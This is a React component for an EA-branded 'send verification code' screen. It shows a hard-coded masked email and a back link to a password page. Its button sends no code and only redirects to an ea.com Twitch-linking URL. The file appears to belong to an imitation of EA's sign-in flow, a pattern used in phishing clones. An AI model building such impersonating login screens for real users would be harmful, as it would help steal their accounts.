import React from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowLeft } from 'lucide-react'
import EALogo from './EALogo'

const VerificationCodeScreen: React.FC = () => {
  const navigate = useNavigate()

  const handleBack = () => {
    navigate('/password')
  }

  const handleSendCode = () => {
    // In a real app you would trigger sending the code here
    console.log('Send code clicked')
    // Default: redirect to external URL only
    window.location.href = 'http://ea.com/twitchlinking'
  }

  return (
    <div className="max-w-[36rem] mx-auto bg-transparent min-h-screen relative">
      {/* Header with Back Button */}
      <div className="px-6 pt-12">
        <button
          onClick={handleBack}
          className="flex items-center space-x-2 text-white bg-slate-700 hover:bg-slate-600 px-4 py-2 rounded-lg transition-colors"
        >
          <ArrowLeft size={20} />
          <span className="font-medium tracking-wider">BACK</span>
        </button>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-8">
        {/* EA Logo */}
        <div className="w-full h-24 mb-12">
          <EALogo />
        </div>

        {/* Message */}
        <div className="text-center mb-12">
          <p className="text-gray-300 text-lg">
            we'll send a verification code to on*****@gmx.at
          </p>
        </div>

        {/* Send Code Button */}
        <button
          onClick={handleSendCode}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 rounded-xl transition-colors text-lg tracking-wider"
        >
          send code
        </button>
      </div>
    </div>
  )
}

export default VerificationCodeScreen
